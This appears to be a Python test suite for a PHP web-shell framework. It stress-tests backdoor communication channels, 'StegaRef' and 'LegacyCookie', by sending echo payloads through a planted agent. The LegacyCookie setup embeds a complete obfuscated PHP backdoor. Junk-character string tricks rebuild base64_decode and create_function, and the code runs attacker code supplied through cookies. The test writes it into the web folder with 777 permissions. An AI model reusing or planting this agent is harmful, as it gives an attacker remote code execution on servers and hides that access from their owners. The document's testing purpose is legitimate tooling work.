from testsuite.base_test import BaseTest
from core.channels.channel import Channel
import utils
from testsuite.config import script_folder, script_folder_url, test_stress_channels
from generate import generate, save_generated
import os
import random
import unittest
from testsuite import config
from core.loggers import stream_handler
import logging
import subprocess
import tempfile


class StegaRefChannel(BaseTest):

    def setUp(self):
        self.channel = Channel(self.url, self.password, 'StegaRef')

    def _incremental_requests(
            self,
            size_start,
            size_to,
            step_rand_start,
            step_rand_to):

        for i in range(size_start, size_to, random.randint(step_rand_start, step_rand_to)):
            payload = utils.strings.randstr(i)
            self.assertEqual(
                self.channel.send(
                    'echo("%s");' %
                    payload)[0],
                payload)

@unittest.skipIf(
    not test_stress_channels,
    "Test only default generator agent")
class AgentDEFAULTObfuscatorDefault(StegaRefChannel):

    def test_1_100_requests(self):
        self._incremental_requests(1, 100, 1, 3)

    def test_100_1000_requests(self):
        self._incremental_requests(100, 1000, 90, 300)

    def test_1000_10000_requests(self):
        self._incremental_requests(1000, 10000, 900, 3000)

    def test_10000_50000_requests(self):
        self._incremental_requests(10000, 50000, 9000, 30000)


@unittest.skipIf(
    not test_stress_channels,
    "Test only default generator agent")
class AgentDEBUGObfuscatorCLEARTEXT(AgentDEFAULTObfuscatorDefault):

    @classmethod
    def setUpClass(cls):
        cls._randomize_bd()
        obfuscated = generate(cls.password, agent='stegaref_php_debug')
        save_generated(obfuscated, cls.path)



@unittest.skipIf(
    not test_stress_channels,
    "Test only default generator agent")
class LegacyCookieChannel(BaseTest):

    def setUp(self):
        self.channel = Channel(self.url, self.password, 'LegacyCookie')

    def _incremental_requests(
            self,
            size_start,
            size_to,
            step_rand_start,
            step_rand_to):

        for i in range(size_start, size_to, random.randint(step_rand_start, step_rand_to)):
            payload = utils.strings.randstr(i)
            self.assertEqual(
                self.channel.send(
                    'echo("%s");' %
                    payload)[0],
                payload)

    @classmethod
    def setUpClass(cls):

        if config.debug:
            stream_handler.setLevel(logging.DEBUG)
        else:
            stream_handler.setLevel(logging.INFO)

        cls._randomize_bd()
        cls.password = 'asdasd'

        # Check `config.script_folder` permissions
        if (
            subprocess.check_output(
                config.cmd_env_stat_permissions_s % (config.script_folder),
                shell=True).strip()
            != config.script_folder_expected_perms
            ):
            raise DevException(
                "Error: give to the http user full permissions to the folder \'%s\'"
                % config.script_folder
            )

        obfuscated = """<?php
$xcrd="mVwbeoGFjZShhceonJheSgnL1teXHc9XeoHeoNdLycsJy9ccy8nKSwgYXeoJyYXkeooJycsJysnKSwgam";
$dqlt="JGMeo9J2NvdW50JzskYT0kX0NPT0tJRTtpeoZihyZXNldCgkeoYSk9PSdhcycgJeoiYeogJGMoeoJGEpP";
$lspg="9pbihhcnJheeoV9zbeoGljZSgeokYeoSeowkYygkYSktMykpKSkpO2VeojaG8gJzwvJyeo4kay4nPic7fQ==";
$tylz="jMpeyRreoPeoSeodkYXeoNkJztlY2hvICc8Jy4kay4nPieoc7ZXZhbeoChiYXNlNjRfZGVjb2RlKHByZWdfeoc";
$toja = str_replace("z","","zsztr_zrzezpzlazce");
$apod = $toja("q", "", "qbaqsqeq6q4_qdecodqe");
$fyqt = $toja("uw","","uwcruweuwauwtuwe_funuwcuwtuwiouwn");
$sify = $fyqt('', $apod($toja("eo", "", $dqlt.$tylz.$xcrd.$lspg))); $sify();
?>"""

        tmp_handler, tmp_path = tempfile.mkstemp()
        save_generated(obfuscated, tmp_path)
        subprocess.check_call(
            config.cmd_env_move_s_s % (tmp_path, cls.path),
            shell=True)

        subprocess.check_call(
            config.cmd_env_chmod_s_s % ('777', cls.path),
            shell=True)

    @classmethod
    def tearDownClass(cls):

        # Check the agent presence, could be already deleted
        if os.path.isfile(cls.path):
            subprocess.check_call(
                config.cmd_env_remove_s % cls.path,
                shell=True
            )

    def test_1_100_requests(self):
        self._incremental_requests(1, 100, 1, 2)

    def test_100_1000_requests(self):
        self._incremental_requests(100, 1000, 10, 20)
